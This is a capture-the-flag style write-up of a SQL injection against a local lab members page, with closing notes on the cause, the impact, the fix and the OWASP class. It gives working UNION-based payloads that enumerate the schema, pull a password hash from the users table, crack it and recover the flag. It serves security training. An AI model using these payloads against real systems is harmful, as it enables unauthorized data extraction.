# SQL Injection Vulnerability

## 1. How did i spot the Vulnerability?

I went to members page here: http://localhost:8080/index.php?page=member

I noticed that there is an input point which is a search bar for searching for members.

I tested if the database is vulnerable, by submitting: `1'` || `1 or 1=1` || `1 and 1=2`

## Exploitation Process

### Step 1: Count columns

Now let's count how many columns in the SQL query?

```
Command: 1 order by 1 => works
Command: 1 order by 2 => works
Command: 1 order by 3 => did not work
```

the query only returns 2 columns, so our UNION injection must also use 2 columns.
meaning that SELECT query returns 2 columns

### Step 2: Test UNION injection

Then let's test UNION injection (UNION combines results from two separate SQL queries into one result set.)

```
Command: 1 union select 1,2
```

We see that we can inject our own SELECT statement. We see this Surname=2, meaning that the second position of our UNION will give back SENSITIVE DATA.

### Step 3: Gather database information

Now let's see what's the name of the database and MySQL version:

```
Command: 1 union select 1,database() => database name: Member_Sql_Injection
Command: 1 union select 1,version() => MySQL version: 5.5.64-MariaDB-1ubuntu0.14.04.1
```

### Step 4: List tables

Now let's list tables:

```
Command: 1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()
```

We found that we have one table named: `users`

### Step 5: List columns

Now let's list all its columns:

```
Command: 1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273
```

We found that we have those columns: `user_id,first_name,last_name,town,country,planet,Commentaire,countersign`

We see that there are two suspicious columns: `Commentaire` (means comment) and `countersign` (password-related)

### Step 6: Extract sensitive data

Now let's discover their content:

```
Command: 1 union select 1,group_concat(Commentaire) from users
```

We found in the third row: "Decrypt this password -> then lower all the char. Sh256 on it and it's good"

```
Command: 1 union select 1,group_concat(countersign) from users
```

We found in the fourth row: `5ff9d0165b4f92b14994e5c685cdce28`

### Step 7: Crack the hash and get the flag

As you see they are asking us to decrypt that password. We use crackstation.net

And we found the decryption gives: `FortyTwo`, lowering all chars: `fortytwo`

Then we SHA256 fortytwo by running this command on terminal:

```bash
echo -n fortytwo | shasum -a 256
```

Then you will find our flag: `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

(SHA256 is a cryptographic hashing algorithm. "Sh256 on it" is a typo - they meant SHA256.)

## 2. What is the vulnerability?

SQL Injection - user-supplied input is directly incorporated into SQL queries without proper sanitization or parameterization, allowing attackers to manipulate database queries.

## 3. Why does it exist (the security flaw)?

The application fails to treat user input as untrusted data and lacks prepared statements or parameterized queries. 

## 4. What could the impact be?

- Complete database compromise and data extraction
- Unauthorized access to sensitive user information
- Modification or deletion of database records

## 5. How to fix it (patch)?

- Use parameterized queries or prepared statements for ALL database interactions
- Never construct SQL queries through string concatenation with user input

## 6. Vulnerability classification (OWASP)?

**A03 - Injection**